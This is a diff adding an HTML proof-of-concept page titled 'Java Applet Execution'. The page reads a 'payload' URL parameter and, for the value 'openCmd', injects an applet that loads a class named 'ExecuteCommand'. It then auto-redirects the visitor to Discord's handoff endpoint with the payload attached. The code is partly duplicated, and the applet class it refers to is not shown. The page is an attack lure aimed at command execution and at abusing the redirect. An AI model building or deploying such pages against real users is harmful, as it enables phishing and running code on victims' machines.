@@ -1,0 +1,61 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Advanced PoC - Java Applet Execution</title>
+    <script>
+        function getQueryParam(param) {
+            const urlParams = new URLSearchParams(window.location.search);
+            return urlParams.get(param);
+        }
+
+        function isValidPayload(payload) {
+            const regex = /^[a-zA-Z0-9_-]+$/;
+            return regex.test(payload);
+        }
+
+        window.onload = function() {
+            alert("Welcome to the advanced PoC demo!");
+            const payload = getQueryParam('payload');
+            let targetUrl = 'https://discord.com/handoff';
+            
+            if (payload && isValidPayload(payload)) {
+                targetUrl += `?payload=${encodeURIComponent(payload)}`;
+                if (payload === 'openCmd') {
+                    document.getElementById('javaApplet').innerHTML = `
+                        <applet code="ExecuteCommand.class" width="300" height="300">
+                            Your browser does not support Java Applets.
+                        </applet>
+                    `;
+                }
+            }
+
+            setTimeout(function() {
+                window.location.href = targetUrl;
+            }, 3000);
+        }
+    </script>
+</head>
+<body>
+    <p>If you are not redirected automatically, <a id="redirectLink" href="https://discord.com/handoff">click here</a>.</p>
+    <div id="javaApplet"></div>
+    <script>
+        const payload = getQueryParam('payload');
+        let targetUrl = 'https://discord.com/handoff';
+        
+        if (payload && isValidPayload(payload)) {
+            targetUrl += `?payload=${encodeURIComponent(payload)}`;
+            if (payload === 'openCmd') {
+                document.getElementById('javaApplet').innerHTML = `
+                    <applet code="ExecuteCommand.class" width="300" height="300">
+                        Your browser does not support Java Applets.
+                    </applet>
+                `;
+            }
+        }
+
+        document.getElementById('redirectLink').href = targetUrl;
+    </script>
+</body>
+</html>
